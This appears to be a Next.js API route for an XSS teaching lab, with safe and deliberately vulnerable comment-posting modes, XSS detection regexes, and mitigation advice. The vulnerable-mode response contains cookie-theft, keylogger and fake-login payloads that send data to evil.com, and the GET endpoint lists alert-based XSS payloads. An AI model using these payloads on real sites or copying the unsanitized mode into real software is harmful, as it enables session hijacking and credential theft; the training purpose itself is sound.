import { NextRequest, NextResponse } from 'next/server'
import { PrismaClient } from '@prisma/client'

const prisma = new PrismaClient()

// Simulated comments storage (fallback)
const comments = [
  { id: 1, author: 'Alice', content: 'Great article!', timestamp: '2024-01-15T10:00:00Z' },
  { id: 2, author: 'Bob', content: 'Thanks for sharing', timestamp: '2024-01-15T11:00:00Z' }
]

export async function POST(request: NextRequest) {
  try {
    const { comment, author, testMode = 'safe' } = await request.json()

    if (!comment) {
      return NextResponse.json(
        { error: 'Comment content is required' },
        { status: 400 }
      )
    }

    // Safe mode - proper input sanitization
    if (testMode === 'safe') {
      // Sanitize HTML to prevent XSS
      const sanitizedComment = sanitizeHtml(comment)
      const sanitizedAuthor = sanitizeHtml(author || 'Anonymous')

      const newComment = {
        id: comments.length + 1,
        author: sanitizedAuthor,
        content: sanitizedComment,
        timestamp: new Date().toISOString()
      }

      comments.push(newComment)

      const result = {
        success: true,
        message: 'Comment posted successfully (safe mode)',
        comment: newComment,
        originalInput: comment,
        sanitizedOutput: sanitizedComment,
        security: {
          xssPrevention: 'HTML entities escaped',
          safeForDisplay: true,
          vulnerabilities: 'None detected'
        }
      }

      // Save test result to database
      try {
        await prisma.xssTest.create({
          data: {
            author: sanitizedAuthor,
            comment: comment,
            testMode: 'safe',
            success: true,
            attackDetected: false,
            xssType: null,
            severity: 'low',
            sanitized: 'yes',
            ipAddress: request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown',
            userAgent: request.headers.get('user-agent') || 'unknown',
            result: JSON.stringify(result)
          }
        })
      } catch (dbError) {
        console.error('Failed to save XSS test to database:', dbError)
      }

      return NextResponse.json(result)
    }

    // Vulnerable mode - XSS possible
    if (testMode === 'vulnerable') {
      // Enhanced XSS pattern detection with categorization
      const xssPatterns = [
        { pattern: /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, name: 'Script Tag Injection', type: 'Stored XSS', severity: 'critical' },
        { pattern: /<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, name: 'Iframe Injection', type: 'Stored XSS', severity: 'critical' },
        { pattern: /javascript:/gi, name: 'JavaScript Protocol', type: 'Reflected XSS', severity: 'high' },
        { pattern: /on\w+\s*=/gi, name: 'Event Handler Injection', type: 'DOM-based XSS', severity: 'high' },
        { pattern: /<img[^>]*src[^>]*javascript:/gi, name: 'Image JavaScript Source', type: 'Reflected XSS', severity: 'high' },
        { pattern: /<svg[^>]*onload[^>]*>/gi, name: 'SVG Onload Event', type: 'DOM-based XSS', severity: 'critical' },
        { pattern: /<link[^>]*href[^>]*javascript:/gi, name: 'Link JavaScript Href', type: 'Reflected XSS', severity: 'medium' },
        { pattern: /<object[^>]*data[^>]*>/gi, name: 'Object Tag Injection', type: 'Stored XSS', severity: 'high' },
        { pattern: /<embed[^>]*src[^>]*>/gi, name: 'Embed Tag Injection', type: 'Stored XSS', severity: 'high' },
        { pattern: /<input[^>]*onfocus[^>]*>/gi, name: 'Input Event Handler', type: 'DOM-based XSS', severity: 'medium' },
        { pattern: /<body[^>]*onload[^>]*>/gi, name: 'Body Onload Event', type: 'DOM-based XSS', severity: 'critical' },
        { pattern: /<meta[^>]*http-equiv[^>]*>/gi, name: 'Meta Refresh Injection', type: 'Reflected XSS', severity: 'medium' },
        { pattern: /eval\s*\(/gi, name: 'Eval Function Call', type: 'DOM-based XSS', severity: 'critical' },
        { pattern: /expression\s*\(/gi, name: 'CSS Expression', type: 'DOM-based XSS', severity: 'high' },
        { pattern: /<base[^>]*href[^>]*>/gi, name: 'Base Tag Injection', type: 'Reflected XSS', severity: 'medium' }
      ]

      const detectedPattern = xssPatterns.find(({ pattern }) => pattern.test(comment))
      const hasXSS = !!detectedPattern

      if (hasXSS) {
        // Log to dashboard
        try {
          await fetch(`${request.nextUrl.origin}/api/dashboard`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              eventType: 'XSS_ATTACK',
              description: 'XSS attack detected in comment',
              payload: { comment, author },
              severity: 'high',
              blocked: false
            })
          })
        } catch (e) {
          console.error('Failed to log to dashboard:', e)
        }
        
        // Prepare result object
        const result = {
          success: true,
          message: '🚨 XSS VULNERABILITY DETECTED! Malicious script injected!',
          vulnerability: 'Cross-Site Scripting (XSS)',
          attackType: detectedPattern.name,
          xssType: detectedPattern.type,
          severity: detectedPattern.severity,
          impact: 'Critical - Malicious JavaScript execution in victim browsers',
          maliciousInput: comment,
          simulatedAttack: {
            type: detectedPattern.type,
            vector: detectedPattern.name,
            execution: detectedPattern.type === 'Stored XSS' 
              ? 'Script permanently stored and executes whenever page is loaded'
              : detectedPattern.type === 'Reflected XSS'
              ? 'Script reflects from server response immediately'
              : 'Script executes through DOM manipulation',
            payload: comment
          },
          realWorldImpact: [
            '🔐 Session Hijacking: Steal session tokens via document.cookie',
            '🎣 Phishing: Create fake login forms to capture credentials',
            '💉 Malware Distribution: Redirect users to malicious downloads',
            '🔑 Keylogging: Capture all keyboard input on the page',
            '📡 Data Exfiltration: Send sensitive data to attacker server',
            '🎭 Defacement: Modify page content to spread misinformation',
            '🌐 CSRF Attacks: Perform actions on behalf of the victim',
            '📱 Cryptojacking: Mine cryptocurrency using victim\'s resources'
          ],
          exploitScenarios: [
            {
              scenario: 'Cookie Theft',
              code: '<script>fetch("https://evil.com?c="+document.cookie)</script>',
              impact: 'Attacker gains session access'
            },
            {
              scenario: 'Keylogger',
              code: '<script>document.onkeypress=function(e){fetch("https://evil.com?k="+e.key)}</script>',
              impact: 'All keystrokes sent to attacker'
            },
            {
              scenario: 'Phishing Form',
              code: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><form action="https://evil.com">Username:<input name="u">Password:<input name="p" type="password"><button>Login</button></form></div>',
              impact: 'Fake login form captures credentials'
            }
          ],
          explanation: `The application failed to sanitize user input, allowing injection of: ${detectedPattern.name}.\n\n` +
                      `Attack Flow:\n` +
                      `1. Attacker submits malicious ${detectedPattern.type} payload\n` +
                      `2. Application stores/reflects the payload without sanitization\n` +
                      `3. Victim's browser executes the malicious JavaScript\n` +
                      `4. Attacker gains access to sensitive data or performs malicious actions`,
          prevention: [
            '✅ Input Sanitization: Use DOMPurify or similar libraries to clean HTML',
            '✅ Output Encoding: Encode special characters (&lt; &gt; &quot; &#x27; &amp;)',
            '✅ Content Security Policy: Set CSP headers to restrict script sources',
            '✅ HTTPOnly Cookies: Prevent JavaScript access to session cookies',
            '✅ X-XSS-Protection: Enable browser XSS filtering',
            '✅ Template Engines: Use auto-escaping template engines (React, Angular)',
            '✅ Input Validation: Whitelist allowed characters and patterns',
            '✅ Context-aware Escaping: Different escaping for HTML, JS, CSS, URL contexts'
          ],
          codeExamples: {
            vulnerable: `// Vulnerable code\nres.send("<div>" + userInput + "</div>");`,
            secure: `// Secure code\nimport DOMPurify from 'dompurify';\nconst clean = DOMPurify.sanitize(userInput);\nres.send("<div>" + clean + "</div>");`,
            cspHeader: `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'`
          },
          mitigation: [
            'Always escape HTML entities',
            'Use Content Security Policy (CSP)',
            'Validate input on server side',
            'Use libraries like DOMPurify',
            'HttpOnly cookies',
            'SameSite cookie attributes'
          ]
        }

        // Save test result to database
        try {
          await prisma.xssTest.create({
            data: {
              author: author || 'Anonymous',
              comment: comment,
              testMode: 'vulnerable',
              success: true,
              attackDetected: true,
              xssType: detectedPattern.type,
              severity: detectedPattern.severity,
              sanitized: 'no',
              ipAddress: request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown',
              userAgent: request.headers.get('user-agent') || 'unknown',
              result: JSON.stringify(result)
            }
          })
        } catch (dbError) {
          console.error('Failed to save XSS test to database:', dbError)
        }

        return NextResponse.json(result)
      }

      // Normal comment in vulnerable mode (no XSS detected)
      const newComment = {
        id: comments.length + 1,
        author: author || 'Anonymous',
        content: comment,
        timestamp: new Date().toISOString()
      }

      comments.push(newComment)

      const result = {
        success: true,
        message: 'Comment posted successfully',
        comment: newComment,
        security: {
          xssPrevention: 'None (vulnerable mode)',
          safeForDisplay: hasXSS ? false : true,
          vulnerabilities: hasXSS ? 'XSS detected' : 'None detected'
        }
      }

      // Save test result to database
      try {
        await prisma.xssTest.create({
          data: {
            author: author || 'Anonymous',
            comment: comment,
            testMode: 'vulnerable',
            success: true,
            attackDetected: false,
            xssType: null,
            severity: 'low',
            sanitized: 'no',
            ipAddress: request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown',
            userAgent: request.headers.get('user-agent') || 'unknown',
            result: JSON.stringify(result)
          }
        })
      } catch (dbError) {
        console.error('Failed to save XSS test to database:', dbError)
      }

      return NextResponse.json(result)
    }

    return NextResponse.json(
      { error: 'Invalid test mode' },
      { status: 400 }
    )

  } catch (error) {
    console.error('XSS test error:', error)
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    )
  }
}

export async function GET() {
  return NextResponse.json({
    message: 'XSS Testing API',
    comments: comments,
    endpoints: {
      'POST /api/xss': {
        description: 'Test XSS vulnerability',
        parameters: {
          comment: 'string (required)',
          author: 'string (optional)',
          testMode: 'safe|vulnerable (default: safe)'
        },
        examples: {
          safe: {
            comment: 'Hello world!',
            author: 'John',
            testMode: 'safe'
          },
          vulnerable: {
            comment: '<script>alert("XSS")</script>',
            author: 'Attacker',
            testMode: 'vulnerable'
          }
        }
      }
    },
    xssPayloads: [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload="alert(\'XSS\')">',
      '<input autofocus onfocus="alert(\'XSS\')">'
    ],
    warning: 'This API is for educational purposes only. Do not use for malicious activities.'
  })
}

// HTML sanitization function
function sanitizeHtml(input: string): string {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;')
}